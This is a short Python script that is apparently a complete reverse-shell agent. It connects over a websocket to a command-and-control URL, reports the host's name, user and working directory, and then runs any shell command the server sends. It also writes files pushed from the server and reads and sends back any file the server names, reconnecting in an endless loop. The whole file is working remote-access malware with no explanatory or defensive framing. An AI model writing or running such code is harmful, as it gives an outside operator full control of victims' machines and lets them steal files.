import os
import sys
import json
import socket
import subprocess
import base64
import time
import platform
import websocket

C2_URL = "wss://textgame-9-c2.fly.dev/shell"
SESSION_ID = "rs-" + socket.gethostname() + "-" + str(int(time.time()))


def send(ws, obj):
    try:
        ws.send(json.dumps(obj))
    except Exception:
        pass


def fingerprint():
    return {
        "os": sys.platform,
        "hostname": socket.gethostname(),
        "user": os.getenv("USER") or os.getenv("USERNAME") or "?",
        "cwd": os.getcwd(),
        "python": platform.python_version(),
    }


def run_cmd(ws, cmd):
    try:
        proc = subprocess.Popen(
            cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT
        )
        try:
            out, _ = proc.communicate(timeout=60)
        except subprocess.TimeoutExpired:
            proc.kill()
            out = b"[timeout 60s]"
        text = out.decode("utf-8", errors="ignore")
        if not text:
            text = f"[exit {proc.returncode}, no output]"
        send(ws, {"t": "reply", "data": text})
    except Exception as e:
        send(ws, {"t": "reply", "data": f"[exec error] {e}"})


def do_upload(ws, path, b64_data):
    try:
        with open(path, "wb") as f:
            f.write(base64.b64decode(b64_data))
        send(ws, {"t": "upload_ack", "path": path, "ok": True})
    except Exception as e:
        send(ws, {"t": "upload_ack", "path": path, "ok": False, "err": str(e)})


def do_download(ws, path):
    try:
        with open(path, "rb") as f:
            data = f.read()
        send(ws, {
            "t": "download",
            "path": path,
            "data": base64.b64encode(data).decode(),
            "size": len(data),
        })
    except Exception as e:
        send(ws, {"t": "download", "path": path, "error": str(e)})


def main():
    while True:
        try:
            print(f"[*] connect {C2_URL}")
            ws = websocket.create_connection(C2_URL, timeout=30)
            send(ws, {"t": "hello", "id": SESSION_ID, "fp": fingerprint()})
            print("[+] connected")

            while True:
                msg = ws.recv()
                if not msg:
                    break
                try:
                    frame = json.loads(msg)
                except json.JSONDecodeError:
                    continue
                t = frame.get("t")
                if t == "cmd":
                    run_cmd(ws, frame.get("cmd", ""))
                elif t == "upload":
                    do_upload(ws, frame.get("path"), frame.get("data"))
                elif t == "download":
                    do_download(ws, frame.get("path"))
        except Exception as e:
            print(f"[-] {e}; retry 5s")
            time.sleep(5)


if __name__ == "__main__":
    main()
